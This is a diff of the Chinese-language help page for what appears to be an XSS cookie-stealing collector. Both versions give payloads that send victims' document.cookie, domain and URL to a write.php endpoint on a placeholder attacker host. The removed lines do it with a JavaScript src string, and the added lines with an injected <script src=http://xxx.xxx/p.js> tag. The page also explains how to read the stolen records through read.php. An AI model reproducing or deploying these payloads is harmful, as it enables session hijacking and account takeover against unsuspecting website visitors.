@@ -23,13 +23,13 @@
 				target="_blank"><b>点此测试数据库连接</b></a>
 		</p>
 		<p>
-			<b>写入方法</b>：write.php?domain=FOO&amp;url=BAR&amp;cookie=ABC%3dabc<br />
-			JavaScript例子：src=&#39;http://***.com/write.php?domain=&#39;+escape(document.domain)+&#39;&amp;url=&#39;+escape(document.URL)+&#39;&amp;cookie=&#39;+escape(document.cookie)
+			<b>写入方法：</b>请求write.php，Method包括GET和POST，参数为domain location toplocation cookie opener<br />
+			可直接使用p.js，例如插入&lt;script&nbsp;src=http://xxx.xxx/p.js&gt;&lt;/script&gt;
 		</p>
 		<p>
 			<b>读取方法</b>：<a href="read.php" target="_blank"><b>read.php</b></a>
 		</p>
-		<p>如果设置了密码，请在URL中附加query string：pwd=YOURPASSWORD</p>
+		<p>如果设置了密码，请在请求中附加参数：pwd=YOURPASSWORD</p>
 		<p>
 			修改网站配色<a href="color.php" target="_blank">color.php</a>
 		</p>
